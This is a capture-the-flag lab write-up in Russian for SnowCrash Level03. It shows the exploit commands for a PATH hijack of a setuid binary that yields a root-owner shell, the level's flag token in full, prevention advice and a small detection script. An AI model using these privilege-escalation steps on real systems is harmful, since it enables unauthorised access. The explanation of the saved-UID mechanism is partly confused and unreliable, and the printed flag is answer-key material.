Level03
=======

Flag
----

qi0maab88jeaj46qoumi7maus

Discovery
---------

Основная задача, как и во всех упражнениях SnowCrash — выполнить `getflag` под нужным пользователем. Тогда команда вернёт токен, который используется для аутентификации.

### Попытка вызвать getflag

    level03@SnowCrash:~$ getflag
    Check flag.Here is your token :
    Nope there is no token here for you sorry. Try again :)
    

### Проверка содержимого директории

В каталоге находится бинарный файл **level03**:

    level03@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
    

Файл принадлежит пользователю **flag03**, группе **level03**, и имеет **setuid/setgid** биты.

Запуск показывает:

    ./level03
    Exploit me
    

### Анализ через nm

Проверил, какие функции используются в бинарнике:

    nm level03
    ...
    080484a4 T main
             U system@@GLIBC_2.0
             U setresuid@@GLIBC_2.0
             U setresgid@@GLIBC_2.0
    ...
    

В секции `main` есть вызов **system()**, что почти наверняка является уязвимостью.

### Динамический анализ через ltrace

Запустил программу:

    level03@SnowCrash:~$ ltrace ./level03
    getegid() = 2003
    geteuid() = 2003
    setresgid(2003, 2003, 2003) = 0
    setresuid(2003, 2003, 2003) = 0
    system("/usr/bin/env echo Exploit me"Exploit me
    ...
    

### Что это значит

Программа явно сбрасывает свои UID/GID:

*   `setresgid(2003,2003,2003)` → OK
*   `setresuid(2003,2003,2003)` → OK

То есть она ДЕЛИБЕРАТНО сбрасывает привилегии на level03.

Но ключевое — вызов:

    system("/usr/bin/env echo Exploit me")
    

`/usr/bin/env` ищет `echo` в переменной окружения PATH.

### Причина уязвимости

Если изменить PATH так, чтобы первым был каталог с поддельным `echo`, программа выполнит наш скрипт с правами владельца файла **flag03**. Файл level03 принадлежит пользователю flag03 и имеет setuid‑бит (-rwsr-sr-x).
    
    chmod u+s → включает setuid (запуск от имени владельца).
    chmod g+s → включает setgid (запуск от имени группы).

В комбинации с обычными правами это даёт именно такую запись: -rwsr-sr-x. Это значит: когда ты, находясь под пользователем level03, запускаешь этот бинарник, ядро Linux автоматически выставляет эффективный UID процесса = владельцу файла, то есть flag03. Таким образом, процесс реально работает с правами flag03, даже если ты его вызвал как level03. Внутри программы есть вызовы setresuid(2003,2003,2003) и setresgid(2003,2003,2003). То есть автор программы сбрасывает свои права обратно на level03. Поэтому ltrace честно показывает, что текущий EUID/GID = 2003. Но у процесса всё равно остаётся сохранённый UID=3003 (flag03) благодаря setuid‑механизму. Это позволяет при вызове system() или других функций снова использовать права владельца файла.

### Создание поддельного echo

    echo '#!/bin/bash' > /tmp/echo
    echo '/bin/sh' >> /tmp/echo
    chmod +x /tmp/echo
    export PATH=/tmp:$PATH
    ./level03
    

### Получение флага

    level03@SnowCrash:~$ ./level03 
    $ getflag
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
    

Use (Exploit)
-------------

Эксплойт основан на классической уязвимости: подмена системной команды через PATH в сочетании с setuid-бинарником.

Хотя программа вызывает `setresuid(2003,...)` и сбрасывает привилегии, она всё равно была запущена ядром с эффективным UID=**flag03**, потому что имеет setuid-бит:

\-rwsr-sr-x 1 flag03 level03 ...

Системный вызов `system()` порождает новый процесс, который наследует сохранённые UID процесса, и под определёнными условиями запускается с правами владельца файла.

Поэтому поддельный `echo` выполняется от имени **flag03**.

Prevention
----------

### Ошибки уровня

*   **Использование system()** — небезопасно, так как зависит от PATH и оболочки.
*   **setuid‑бинарник вызывает system()** — классическая опасность.
*   **Неполное сбрасывание привилегий** — даже вызвав setresuid, программа сохраняет saved UID.

### Как предотвратить

*   Заменить `system()` на `execve()` с абсолютным путём.
*   Жёстко задавать PATH, очищать окружение перед вызовом внешних программ.
*   Полностью сбрасывать привилегии: `setuid(getuid())` без сохранения setuid.
*   Избегать setuid вообще, если можно.

Documentation
-------------

*   `man system`
*   `man execve`
*   `man setuid`
*   `man capabilities`
*   Reverse engineering basics — https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d

Automatic Testing
-----------------

Базовый тест, проверяющий наличие вызовов system() в setuid-бинарниках:

    #!/bin/bash
    
    FILE=./level03
    
    if [[ -u $FILE ]]; then
      echo "Warning: setuid binary detected"
      if strings "$FILE" | grep -q "system("; then
        echo "Danger: setuid binary uses system()"
        exit 1
      fi
    fi
    
    echo "OK"